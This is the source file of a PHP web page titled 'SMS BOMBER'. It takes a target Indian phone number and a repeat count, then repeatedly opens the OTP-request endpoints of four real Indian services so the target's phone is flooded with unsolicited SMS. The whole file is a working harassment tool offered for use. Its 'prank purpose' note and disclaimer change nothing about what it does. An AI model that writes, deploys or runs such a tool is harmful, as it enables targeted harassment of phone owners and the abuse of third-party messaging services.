<!-- Created by Adarsh -->
<!doctype html>
<html>
<head>
<title>SMS BOMBER</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<div style="text-align:center">
<h1><ins>SMS BOMBER</ins></h1>
<br><br>
<form method="post" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']);?>">
<b style="color:red" >Enter target number (without +91) : </b><br>
<input type="text" name="num" maxlength="10">
<br>
<b style="color:red">Count (default : 1) : </b><br>
<input type="number" name="count" min="1" max="50" value="1">
<br><br>
<input type="submit" value="Submit">
</form>
</div>
<?php

$n="";
$c="";

if (empty($_REQUEST["count"])||empty($_REQUEST["num"]))
{ echo " <script> alert('Form cannot be empty.'); </script> "; }
else if (is_numeric($_REQUEST["num"]) && strlen($_REQUEST["num"])==10)
{ $n=$_REQUEST["num"];
$c = $_REQUEST["count"]; 
for ($x = 1; $x <= $c; $x++)
{
if($x%4==0)
{ echo " <script>
window.open('https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=$n');
</script> "; }
else if($x%3==0)
{ echo " <script>
window.open('https://www.oyorooms.com/api/pwa/generateotp?phone=$n');
</script> "; }
else if($x%2==0)
{ echo " <script>
window.open('https://securedapi.confirmkt.com/api/platform/register?mobileNumber=$n');
</script> "; }
else
{ echo " <script>
window.open('https://www.railyatri.in/m/user-web-point?phone_number=$n');
</script> "; }
}
}
else
echo " <script> alert('Enter valid 10 digit number.'); </script>  ";

?>

<br><br>
<p style="color:green"><b><ins>Note :</ins></b><p>
<ul>
<li><i>Unblock pop-ups before using. </i></li>
<li><i>Use it only for prank purpose.</i></li>
<li><i>Developer of this site won't be responsible for any harm done through it.</i></li>
</ul> 
</body>
</html>